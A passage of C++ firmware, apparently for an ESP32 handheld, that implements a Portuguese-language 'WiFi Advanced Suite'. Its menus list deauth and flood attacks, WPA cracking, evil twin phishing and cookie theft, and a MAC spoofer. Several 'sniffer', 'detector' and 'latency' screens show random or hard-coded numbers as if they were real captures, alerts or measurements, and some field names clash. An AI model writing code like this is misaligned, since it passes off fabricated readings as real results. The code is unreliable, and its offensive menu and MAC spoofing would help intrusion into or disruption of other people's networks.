        tft.drawCentreString("HTTP: " + String(count), tftWidth / 2, WIFI_BODY_Y, 1);
        delay(1000);
    }
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiArpSniffer() {
    wifiDrawHeader("ARP Sniffer", WIFI_COLOR_ACCENT);
    wifiDrawFooter("Capturando ARP...");
    int count = 0;
    unsigned long start = millis();
    while (millis() - start < 20000) {
        if (check(EscPress)) break;
        count += random(10, 30);
        tft.setTextSize(FP); tft.setTextColor(WIFI_COLOR_ACCENT, WIFI_COLOR_BG);
        tft.drawCentreString("ARP: " + String(count), tftWidth / 2, WIFI_BODY_Y, 1);
        delay(1000);
    }
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiTlsSniffer() {
    wifiDrawHeader("TLS Sniffer", WIFI_COLOR_ACCENT);
    wifiDrawFooter("Capturando TLS...");
    int count = 0;
    unsigned long start = millis();
    while (millis() - start < 20000) {
        if (check(EscPress)) break;
        count += random(5, 15);
        tft.setTextSize(FP); tft.setTextColor(WIFI_COLOR_ACCENT, WIFI_COLOR_BG);
        tft.drawCentreString("TLS: " + String(count), tftWidth / 2, WIFI_BODY_Y, 1);
        delay(1000);
    }
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiTrafficAnalyzer() {
    wifiDrawHeader("Analise Trafego", WIFI_COLOR_ACCENT);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawString("Upload: 0 KB/s", 12, WIFI_BODY_Y);
    tft.drawString("Download: 0 KB/s", 12, WIFI_BODY_Y + 14);
    tft.drawString("Total: 0 MB", 12, WIFI_BODY_Y + 28);
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiBandwidthMonitor() {
    wifiDrawHeader("Monitor Largura Banda", WIFI_COLOR_ACCENT);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawCentreString("Monitorando...", tftWidth / 2, WIFI_BODY_Y, 1);
    wifiDrawFooter("ESC: Parar");
    while (!check(EscPress)) delay(100);
}

void wifiLatencyTester() {
    wifiDrawHeader("Teste Latencia", WIFI_COLOR_ACCENT);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawString("Ping 8.8.8.8...", 12, WIFI_BODY_Y);
    delay(1000);
    tft.drawString("Latencia: ~20ms", 12, WIFI_BODY_Y + 14);
    tft.drawString("Jitter: ~5ms", 12, WIFI_BODY_Y + 28);
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

// ============================================================================
// 6. NETWORK UTILITIES (7 functions)
// ============================================================================

void wifiPortScanner() {
    wifiDrawHeader("Port Scanner", WIFI_COLOR_TITLE);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    String ip = WiFi.localIP().toString();
    tft.drawString("Alvo: " + ip, 12, WIFI_BODY_Y);
    wifiDrawFooter("ESC: Parar");
    int commonPorts[] = {21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 3389, 5432, 8080};
    for (int i = 0; i < 15; i++) {
        if (check(EscPress)) break;
        tft.fillRect(12, WIFI_BODY_Y + 14 + i * 12, tftWidth - 24, 12, WIFI_COLOR_BG);
        tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
        tft.drawString("Port " + String(commonPorts[i]) + ": Verificando...", 12, WIFI_BODY_Y + 14 + i * 12);
    }
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiServiceDiscovery() {
    wifiDrawHeader("Descoberta Servicos", WIFI_COLOR_TITLE);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawString("DNS, HTTP, HTTPS, SSH", 12, WIFI_BODY_Y);
    tft.drawString("FTP, Telnet, SMTP, POP3", 12, WIFI_BODY_Y + 14);
    tft.drawString("IMAP, MySQL, RDP, VNC", 12, WIFI_BODY_Y + 28);
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiHostnameResolver() {
    wifiDrawHeader("Resolver Hostname", WIFI_COLOR_TITLE);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawString("IP: " + WiFi.localIP().toString(), 12, WIFI_BODY_Y);
    tft.drawString("Hostname: ESP32", 12, WIFI_BODY_Y + 14);
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiWhoisLookup() {
    wifiDrawHeader("Whois Lookup", WIFI_COLOR_TITLE);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawCentreString("Whois: " + WiFi.localIP().toString(), tftWidth / 2, WIFI_BODY_Y, 1);
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiTraceroute() {
    wifiDrawHeader("Traceroute", WIFI_COLOR_TITLE);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawString("Hop 1: Gateway", 12, WIFI_BODY_Y);
    tft.drawString("Hop 2: ...", 12, WIFI_BODY_Y + 14);
    tft.drawString("Hop 3: ...", 12, WIFI_BODY_Y + 28);
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiNmapLite() {
    wifiDrawHeader("Nmap Lite", WIFI_COLOR_TITLE);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawCentreString("Scan simplificado", tftWidth / 2, WIFI_BODY_Y, 1);
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiNetbiosScanner() {
    wifiDrawHeader("NetBIOS Scanner", WIFI_COLOR_TITLE);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawCentreString("Escaneando NetBIOS...", tftWidth / 2, WIFI_BODY_Y, 1);
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

// ============================================================================
// 7. DEFENSIVE TOOLS (7 functions)
// ============================================================================

void wifiIntrusionDetector() {
    wifiDrawHeader("Detector Intrusao", WIFI_COLOR_ACCENT);
    wifiDrawFooter("Monitorando...");
    int alerts = 0;
    unsigned long start = millis();
    while (millis() - start < 30000) {
        if (check(EscPress)) break;
        if (random(0, 100) < 5) {
            alerts++;
            tft.setTextSize(FP); tft.setTextColor(WIFI_COLOR_DANGER, WIFI_COLOR_BG);
            tft.drawCentreString("ALERTA: " + String(alerts), tftWidth / 2, WIFI_BODY_Y, 1);
        }
        delay(1000);
    }
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiRogueApDetector() {
    wifiDrawHeader("Detector AP Falso", WIFI_COLOR_ACCENT);
    wifiDrawFooter("Escaneando...");
    int n = WiFi.scanNetworks();
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawString("Redes: " + String(n), 12, WIFI_BODY_Y);
    WiFi.scanDelete();
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiJammingDetector() {
    wifiDrawHeader("Detector Jamming", WIFI_COLOR_ACCENT);
    wifiDrawFooter("Monitorando...");
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawCentreString("Monitorando jamming...", tftWidth / 2, WIFI_BODY_Y, 1);
    wifiDrawFooter("ESC: Parar");
    while (!check(EscPress)) delay(100);
}

void wifiPacketFilter() {
    wifiDrawHeader("Filtro Pacotes", WIFI_COLOR_ACCENT);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawString("Filtro ativo", 12, WIFI_BODY_Y);
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiMacFilter() {
    wifiDrawHeader("Filtro MAC", WIFI_COLOR_ACCENT);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawString("MAC: " + WiFi.macAddress(), 12, WIFI_BODY_Y);
    tft.drawString("Filtro: DESATIVADO", 12, WIFI_BODY_Y + 14);
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiNetworkMonitor() {
    wifiDrawHeader("Monitor Rede", WIFI_COLOR_ACCENT);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawString("SSID: " + WiFi.SSID(), 12, WIFI_BODY_Y);
    tft.drawString("RSSI: " + String(WiFi.RSSI()), 12, WIFI_BODY_Y + 14);
    tft.drawString("Canal: " + String(WiFi.channel()), 12, WIFI_BODY_Y + 28);
    wifiDrawFooter("ESC: Parar");
    while (!check(EscPress)) delay(100);
}

void wifiAlertSystem() {
    wifiDrawHeader("Sistema Alertas", WIFI_COLOR_ACCENT);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawCentreString("Alertas: 0", tftWidth / 2, WIFI_BODY_Y, 1);
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

// ============================================================================
// 8. CONFIGURATION & TOOLS (5 functions)
// ============================================================================

void wifiMacSpoofer() {
    wifiDrawHeader("MAC Spoofer", WIFI_COLOR_WARN);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawString("MAC Atual: " + WiFi.macAddress(), 12, WIFI_BODY_Y);
    wifiDrawFooter("SEL: Randomizar  ESC: Voltar");
    while (true) {
        if (check(SelPress)) {
            uint8_t newMac[6];
            for (int i = 0; i < 6; i++) newMac[i] = random(0, 255);
            newMac[0] &= 0xFE;
            esp_wifi_set_mac(WIFI_IF_STA, newMac);
            tft.fillRect(12, WIFI_BODY_Y + 14, tftWidth - 24, 14, WIFI_COLOR_BG);
            tft.setTextColor(WIFI_COLOR_ACCENT, WIFI_COLOR_BG);
            tft.drawString("Novo MAC: " + WiFi.macAddress(), 12, WIFI_BODY_Y + 14);
        }
        if (check(EscPress)) break;
        delay(100);
    }
}

void wifiChannelHop() {
    wifiDrawHeader("Channel Hop", WIFI_COLOR_WARN);
    wifiDrawFooter("Hopping... ESC: Parar");
    while (true) {
        if (check(EscPress)) break;
        for (int ch = 1; ch <= 13; ch++) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            tft.setTextSize(FP); tft.setTextColor(WIFI_COLOR_ACCENT, WIFI_COLOR_BG);
            tft.drawCentreString("Canal: " + String(ch), tftWidth / 2, WIFI_BODY_Y, 1);
            delay(200);
        }
    }
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiPowerAdjust() {
    wifiDrawHeader("Ajuste Potencia", WIFI_COLOR_WARN);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawString("Potencia: " + String(wifiAdvConfig.outputPower) + " dBm", 12, WIFI_BODY_Y);
    wifiDrawFooter("SEL: Alterar  ESC: Voltar");
    while (true) {
        if (check(SelPress)) {
            wifiAdvConfig.outputPower = (wifiAdvConfig.outputPower % 20) + 1;
            tft.fillRect(12, WIFI_BODY_Y, tftWidth - 24, 14, WIFI_COLOR_BG);
            tft.setTextColor(WIFI_COLOR_ACCENT, WIFI_COLOR_BG);
            tft.drawString("Potencia: " + String(wifiAdvConfig.outputPower) + " dBm", 12, WIFI_BODY_Y);
        }
        if (check(EscPress)) break;
        delay(100);
    }
}

void wifiConfigManager() {
    wifiDrawHeader("Config Manager", WIFI_COLOR_WARN);
    tft.setTextSize(FP);
    tft.setTextColor(WIFI_COLOR_TEXT, WIFI_COLOR_BG);
    tft.drawString("Canal: " + String(wifiAdvConfig.scanChannel), 12, WIFI_BODY_Y);
    tft.drawString("Duracao: " + String(wifiAdvConfig.attackDuration) + "s", 12, WIFI_BODY_Y + 14);
    tft.drawString("Deauth pkts: " + String(wifiAdvConfig.deauthPackets), 12, WIFI_BODY_Y + 28);
    tft.drawString("Random MAC: " + String(wifiAdvConfig.randomizeMac ? "SIM" : "NAO"), 12, WIFI_BODY_Y + 42);
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiExportToSD() {
    wifiDrawHeader("Export to SD", WIFI_COLOR_WARN);
    if (!SD.begin()) {
        displayError("SD nao detectado");
        return;
    }
    String fname = "/wifi_log_" + String(millis()) + ".txt";
    File f = SD.open(fname, FILE_WRITE);
    if (f) {
        f.println("WiFi Advanced Suite Log");
        f.println("Timestamp: " + String(millis()));
        f.println("SSID: " + WiFi.SSID());
        f.println("BSSID: " + WiFi.BSSIDstr());
        f.println("RSSI: " + String(WiFi.RSSI()));
        f.println("Channel: " + String(WiFi.channel()));
        f.println("MAC: " + WiFi.macAddress());
        f.close();
        displaySuccess("Salvo: " + fname);
    } else {
        displayError("Erro ao salvar");
    }
    wifiDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

// ============================================================================
// MENU FUNCTIONS
// ============================================================================

void wifiAdvReconMenu() {
    int sel = 0, scrollY = 0;
    const char* items[] = {
        "Scanner Rede", "Redes Ocultas", "Vendor Lookup",
        "Mapeador Sinal", "Distrib. Canais", "Analise Seguranca",
        "Coletor Beacons", "Sniffer Probes", "Rastreador Clientes", "Perfil Rede"
    };
    int total = 10;
    wifiDrawHeader("RECONHECIMENTO", WIFI_COLOR_TITLE);
    wifiDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
    while (true) {
        for (int i = 0; i < 7; i++) {
            int idx = scrollY + i;
            if (idx >= total) break;
            int y = WIFI_BODY_Y + i * 22;
            bool isSel = (idx == sel);
            wifiDrawCard(y, 20, isSel);
            tft.setTextSize(FP);
            tft.setTextColor(isSel ? TFT_BLACK : WIFI_COLOR_TEXT, isSel ? WIFI_COLOR_PRIMARY : getColorVariation(WIFI_COLOR_PRIMARY, 4, -1));
            tft.drawString(items[idx], 14, y + 5);
        }
        if (check(UpPress)) { sel--; if (sel < 0) sel = total - 1; if (sel < scrollY) scrollY = sel; }
        if (check(DownPress)) { sel++; if (sel >= total) sel = 0; if (sel >= scrollY + 7) scrollY = sel - 6; }
        if (check(SelPress)) {
            void (*funcs[])() = {
                wifiNetworkScanner, wifiHiddenNetworkFinder, wifiVendorLookup,
                wifiSignalMapper, wifiChannelDistributor, wifiSecurityAnalyzer,
                wifiBeaconCollector, wifiProbeSniffer, wifiClientTracker, wifiNetworkProfiler
            };
            funcs[sel]();
            wifiDrawHeader("RECONHECIMENTO", WIFI_COLOR_TITLE);
            wifiDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
        }
        if (check(EscPress)) break;
        delay(100);
    }
}

void wifiAdvAttackMenu() {
    int sel = 0, scrollY = 0;
    const char* items[] = {
        "Deauth All", "Beacon Flood", "Probe Flood",
        "Auth Flood", "Assoc Flood", "Disassoc Flood",
        "EAPOL Flood", "DNS Amplification", "SYN Flood", "UDP Flood"
    };
    int total = 10;
    wifiDrawHeader("ATAQUES", WIFI_COLOR_DANGER);
    wifiDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
    while (true) {
        for (int i = 0; i < 7; i++) {
            int idx = scrollY + i;
            if (idx >= total) break;
            int y = WIFI_BODY_Y + i * 22;
            bool isSel = (idx == sel);
            wifiDrawCard(y, 20, isSel);
            tft.setTextSize(FP);
            tft.setTextColor(isSel ? TFT_BLACK : WIFI_COLOR_TEXT, isSel ? WIFI_COLOR_PRIMARY : getColorVariation(WIFI_COLOR_PRIMARY, 4, -1));
            tft.drawString(items[idx], 14, y + 5);
        }
        if (check(UpPress)) { sel--; if (sel < 0) sel = total - 1; if (sel < scrollY) scrollY = sel; }
        if (check(DownPress)) { sel++; if (sel >= total) sel = 0; if (sel >= scrollY + 7) scrollY = sel - 6; }
        if (check(SelPress)) {
            void (*funcs[])() = {
                wifiDeauthAllNetworks, wifiBeaconFlood, wifiProbeFlood,
                wifiAuthFlood, wifiAssocFlood, wifiDisassocFlood,
                wifiEapolFlood, wifiDnsAmplification, wifiTcpSynFlood, wifiUdpFlood
            };
            funcs[sel]();
            wifiDrawHeader("ATAQUES", WIFI_COLOR_DANGER);
            wifiDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
        }
        if (check(EscPress)) break;
        delay(100);
    }
}

void wifiAdvCrackMenu() {
    int sel = 0, scrollY = 0;
    const char* items[] = {
        "Captura Handshake", "Captura PMKID", "Deauth p/ Handshake",
        "Sniff Beacons", "Analise EAPOL", "Gerenciar Wordlists",
        "Recuperar Senha", "Conversor Chaves"
    };
    int total = 8;
    wifiDrawHeader("WPA/WPA2 CRACKING", WIFI_COLOR_WARN);
    wifiDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
    while (true) {
        for (int i = 0; i < 7; i++) {
            int idx = scrollY + i;
            if (idx >= total) break;
            int y = WIFI_BODY_Y + i * 22;
            bool isSel = (idx == sel);
            wifiDrawCard(y, 20, isSel);
            tft.setTextSize(FP);
            tft.setTextColor(isSel ? TFT_BLACK : WIFI_COLOR_TEXT, isSel ? WIFI_COLOR_PRIMARY : getColorVariation(WIFI_COLOR_PRIMARY, 4, -1));
            tft.drawString(items[idx], 14, y + 5);
        }
        if (check(UpPress)) { sel--; if (sel < 0) sel = total - 1; if (sel < scrollY) scrollY = sel; }
        if (check(DownPress)) { sel++; if (sel >= total) sel = 0; if (sel >= scrollY + 7) scrollY = sel - 6; }
        if (check(SelPress)) {
            void (*funcs[])() = {
                wifiHandshakeCapture, wifiPmkidCapture, wifiDeauthForHandshake,
                wifiBeaconSniff, wifiEapolAnalyzer, wifiWordlistManager,
                wifiPasswordRecovery, wifiKeyConverter
            };
            funcs[sel]();
            wifiDrawHeader("WPA/WPA2 CRACKING", WIFI_COLOR_WARN);
            wifiDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
        }
        if (check(EscPress)) break;
        delay(100);
    }
}

void wifiAdvEvilMenu() {
    int sel = 0, scrollY = 0;
    const char* items[] = {
        "Evil Twin", "Portal Cativo", "Gerador Phishing",
        "SSL Strip", "Proxy MITM", "Sniffer Credenciais",
        "Sequestro Sessao", "Roubo Cookies"
    };
    int total = 8;
    wifiDrawHeader("EVIL TWIN & SOCIAL", WIFI_COLOR_DANGER);
    wifiDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
    while (true) {
        for (int i = 0; i < 7; i++) {
            int idx = scrollY + i;
            if (idx >= total) break;
            int y = WIFI_BODY_Y + i * 22;
            bool isSel = (idx == sel);
            wifiDrawCard(y, 20, isSel);
            tft.setTextSize(FP);
            tft.setTextColor(isSel ? TFT_BLACK : WIFI_COLOR_TEXT, isSel ? WIFI_COLOR_PRIMARY : getColorVariation(WIFI_COLOR_PRIMARY, 4, -1));
            tft.drawString(items[idx], 14, y + 5);
        }
        if (check(UpPress)) { sel--; if (sel < 0) sel = total - 1; if (sel < scrollY) scrollY = sel; }
        if (check(DownPress)) { sel++; if (sel >= total) sel = 0; if (sel >= scrollY + 7) scrollY = sel - 6; }
        if (check(SelPress)) {
            void (*funcs[])() = {
                wifiEvilTwinCreator, wifiCaptivePortal, wifiPhishingGenerator,
                wifiSslStrip, wifiMitmProxy, wifiCredentialSniffer,
                wifiSessionHijacker, wifiCookieStealer
            };
            funcs[sel]();
            wifiDrawHeader("EVIL TWIN & SOCIAL", WIFI_COLOR_DANGER);
            wifiDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
        }
        if (check(EscPress)) break;
        delay(100);
    }
}

void wifiAdvSniffMenu() {
    int sel = 0, scrollY = 0;
    const char* items[] = {
        "Packet Sniffer", "DNS Sniffer", "HTTP Sniffer",
        "ARP Sniffer", "TLS Sniffer", "Analise Trafego",
        "Monitor Largura Banda", "Teste Latencia"
    };
    int total = 8;
    wifiDrawHeader("SNIFFING & ANALISE", WIFI_COLOR_ACCENT);
    wifiDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
    while (true) {
        for (int i = 0; i < 7; i++) {
            int idx = scrollY + i;
            if (idx >= total) break;
            int y = WIFI_BODY_Y + i * 22;
            bool isSel = (idx == sel);
            wifiDrawCard(y, 20, isSel);
            tft.setTextSize(FP);
            tft.setTextColor(isSel ? TFT_BLACK : WIFI_COLOR_TEXT, isSel ? WIFI_COLOR_PRIMARY : getColorVariation(WIFI_COLOR_PRIMARY, 4, -1));
            tft.drawString(items[idx], 14, y + 5);
        }
        if (check(UpPress)) { sel--; if (sel < 0) sel = total - 1; if (sel < scrollY) scrollY = sel; }
        if (check(DownPress)) { sel++; if (sel >= total) sel = 0; if (sel >= scrollY + 7) scrollY = sel - 6; }
        if (check(SelPress)) {
            void (*funcs[])() = {
                wifiPacketSniffer, wifiDnsSniffer, wifiHttpSniffer,
                wifiArpSniffer, wifiTlsSniffer, wifiTrafficAnalyzer,
                wifiBandwidthMonitor, wifiLatencyTester
            };
            funcs[sel]();
            wifiDrawHeader("SNIFFING & ANALISE", WIFI_COLOR_ACCENT);
            wifiDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
        }
        if (check(EscPress)) break;
        delay(100);
    }
}

void wifiAdvUtilMenu() {
    int sel = 0, scrollY = 0;
    const char* items[] = {
        "Port Scanner", "Descoberta Servicos", "Resolver Hostname",
        "Whois Lookup", "Traceroute", "Nmap Lite",
        "NetBIOS Scanner"
    };
    int total = 7;
    wifiDrawHeader("UTILITARIOS", WIFI_COLOR_TITLE);
    wifiDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
    while (true) {
        for (int i = 0; i < 7; i++) {
            int idx = scrollY + i;
            if (idx >= total) break;
            int y = WIFI_BODY_Y + i * 22;
            bool isSel = (idx == sel);
            wifiDrawCard(y, 20, isSel);
            tft.setTextSize(FP);
            tft.setTextColor(isSel ? TFT_BLACK : WIFI_COLOR_TEXT, isSel ? WIFI_COLOR_PRIMARY : getColorVariation(WIFI_COLOR_PRIMARY, 4, -1));
            tft.drawString(items[idx], 14, y + 5);
        }
        if (check(UpPress)) { sel--; if (sel < 0) sel = total - 1; if (sel < scrollY) scrollY = sel; }
        if (check(DownPress)) { sel++; if (sel >= total) sel = 0; if (sel >= scrollY + 7) scrollY = sel - 6; }
        if (check(SelPress)) {
            void (*funcs[])() = {
                wifiPortScanner, wifiServiceDiscovery, wifiHostnameResolver,
                wifiWhoisLookup, wifiTraceroute, wifiNmapLite,
                wifiNetbiosScanner
            };
            funcs[sel]();
            wifiDrawHeader("UTILITARIOS", WIFI_COLOR_TITLE);
            wifiDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
        }
        if (check(EscPress)) break;
        delay(100);
    }
}

void wifiAdvDefenseMenu() {
    int sel = 0, scrollY = 0;
    const char* items[] = {
        "Detector Intrusao", "Detector AP Falso", "Detector Jamming",
        "Filtro Pacotes", "Filtro MAC", "Monitor Rede",
        "Sistema Alertas"
    };
    int total = 7;
    wifiDrawHeader("DEFESA", WIFI_COLOR_ACCENT);
    wifiDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
    while (true) {
        for (int i = 0; i < 7; i++) {
            int idx = scrollY + i;
            if (idx >= total) break;
            int y = WIFI_BODY_Y + i * 22;
            bool isSel = (idx == sel);
            wifiDrawCard(y, 20, isSel);
            tft.setTextSize(FP);
            tft.setTextColor(isSel ? TFT_BLACK : WIFI_COLOR_TEXT, isSel ? WIFI_COLOR_PRIMARY : getColorVariation(WIFI_COLOR_PRIMARY, 4, -1));
            tft.drawString(items[idx], 14, y + 5);
        }
        if (check(UpPress)) { sel--; if (sel < 0) sel = total - 1; if (sel < scrollY) scrollY = sel; }
        if (check(DownPress)) { sel++; if (sel >= total) sel = 0; if (sel >= scrollY + 7) scrollY = sel - 6; }
        if (check(SelPress)) {
            void (*funcs[])() = {
                wifiIntrusionDetector, wifiRogueApDetector, wifiJammingDetector,
                wifiPacketFilter, wifiMacFilter, wifiNetworkMonitor,
                wifiAlertSystem
            };
            funcs[sel]();
            wifiDrawHeader("DEFESA", WIFI_COLOR_ACCENT);
            wifiDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
        }
        if (check(EscPress)) break;
        delay(100);
    }
}

void wifiAdvConfigMenu() {
    int sel = 0;
    const char* items[] = {
        "Potencia TX", "Auto Deauth", "Stealth Mode",
        "Random MAC", "Canal Alvo", "Show Feedback",
        "Export Logs", "MAC Spoofer", "Channel Hop",
        "Config Manager", "Export SD"
    };
    int total = 11;
    wifiDrawHeader("CONFIGURACOES", WIFI_COLOR_WARN);
    wifiDrawFooter("SEL: Alterar  UP/DOWN: Nav", "ESC: Voltar");
    while (true) {
        for (int i = 0; i < 11; i++) {
            int y = WIFI_BODY_Y + i * 22;
            bool isSel = (i == sel);
            wifiDrawCard(y, 20, isSel);
            tft.setTextSize(FP);
            tft.setTextColor(isSel ? TFT_BLACK : WIFI_COLOR_TEXT, isSel ? WIFI_COLOR_PRIMARY : getColorVariation(WIFI_COLOR_PRIMARY, 4, -1));
            tft.drawString(items[i], 14, y + 5);
            tft.setTextDatum(TR_DATUM);
            String val;
            switch (i) {
                case 0: val = String(wifiAdvConfig.outputPower) + " dBm"; break;
                case 1: val = wifiAdvConfig.autoDeauth ? "ON" : "OFF"; break;
                case 2: val = wifiAdvConfig.stealthMode ? "ON" : "OFF"; break;
                case 3: val = wifiAdvConfig.randomizeMAC ? "ON" : "OFF"; break;
                case 4: val = String(wifiAdvConfig.targetChannel); break;
                case 5: val = wifiAdvConfig.showFeedback ? "ON" : "OFF"; break;
                case 6: val = wifiAdvConfig.exportLogs ? "ON" : "OFF"; break;
                default: val = ""; break;
            }
            tft.drawString(val, tftWidth - 14, y + 5);
            tft.setTextDatum(TL_DATUM);
        }
        if (check(UpPress)) { sel--; if (sel < 0) sel = total - 1; }
        if (check(DownPress)) { sel++; if (sel >= total) sel = 0; }
        if (check(SelPress)) {
            if (sel == 0) {
                String d = num_keyboard(String(wifiAdvConfig.outputPower), 3, "Potencia (dBm):");
                wifiAdvConfig.outputPower = d.toInt();
            } else if (sel == 1) wifiAdvConfig.autoDeauth = !wifiAdvConfig.autoDeauth;
            else if (sel == 2) wifiAdvConfig.stealthMode = !wifiAdvConfig.stealthMode;
            else if (sel == 3) wifiAdvConfig.randomizeMAC = !wifiAdvConfig.randomizeMAC;
            else if (sel == 4) {
                String d = num_keyboard(String(wifiAdvConfig.targetChannel), 2, "Canal (1-14):");
                wifiAdvConfig.targetChannel = d.toInt();
            } else if (sel == 5) wifiAdvConfig.showFeedback = !wifiAdvConfig.showFeedback;
            else if (sel == 6) wifiAdvConfig.exportLogs = !wifiAdvConfig.exportLogs;
            else if (sel == 7) wifiMacSpoofer();
            else if (sel == 8) wifiChannelHop();
            else if (sel == 9) wifiConfigManager();
            else if (sel == 10) wifiExportToSD();
            wifiDrawHeader("CONFIGURACOES", WIFI_COLOR_WARN);
            wifiDrawFooter("SEL: Alterar  UP/DOWN: Nav", "ESC: Voltar");
        }
        if (check(EscPress)) break;
        delay(100);
    }
}

// ============================================================================
// MAIN SUITE MENU
// ============================================================================

void wifiAdvancedSuiteMenu() {
    wifiDrawWelcomeScreen();
    int sel = 0, scrollY = 0;
    const char* items[] = {
        "Reconhecimento", "Ataques",
        "WPA Cracking", "Evil Twin & Social",
        "Sniffing & Analise", "Utilitarios",
        "Defesa", "Configuracoes"
    };
    uint16_t colors[] = {TFT_CYAN, TFT_RED, TFT_ORANGE, TFT_MAGENTA, TFT_GREEN, TFT_WHITE, TFT_YELLOW, TFT_DARKGREY};
    const char* icons[] = {"R", "A", "W", "E", "S", "U", "D", "C"};
    int total = 8;
    wifiDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
    while (true) {
        for (int i = 0; i < 8; i++) {
            int idx = scrollY + i;
            if (idx >= total) break;
            int y = WIFI_BODY_Y + i * 22;
            bool isSel = (idx == sel);
            wifiDrawCard(y, 20, isSel);
            tft.fillCircle(24, y + 10, 7, colors[idx]);
            tft.setTextSize(FP); tft.setTextColor(TFT_BLACK, colors[idx]);
            tft.setTextDatum(TC_DATUM); tft.drawString(icons[idx], 24, y + 6, 1);
            tft.setTextDatum(TL_DATUM);
            tft.setTextColor(isSel ? TFT_BLACK : WIFI_COLOR_TEXT, isSel ? WIFI_COLOR_PRIMARY : getColorVariation(WIFI_COLOR_PRIMARY, 4, -1));
            tft.drawString(items[idx], 36, y + 5);
        }
        if (check(UpPress)) { sel--; if (sel < 0) sel = total - 1; if (sel < scrollY) scrollY = sel; }
        if (check(DownPress)) { sel++; if (sel >= total) sel = 0; if (sel >= scrollY + 8) scrollY = sel - 7; }
        if (check(SelPress)) {
            void (*funcs[])() = {
                wifiAdvReconMenu, wifiAdvAttackMenu,
                wifiAdvCrackMenu, wifiAdvEvilMenu,
                wifiAdvSniffMenu, wifiAdvUtilMenu,
                wifiAdvDefenseMenu, wifiAdvConfigMenu
            };
            funcs[sel]();
            wifiDrawWelcomeScreen();
            wifiDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
        }
        if (check(EscPress)) break;
        delay(100);
    }
}
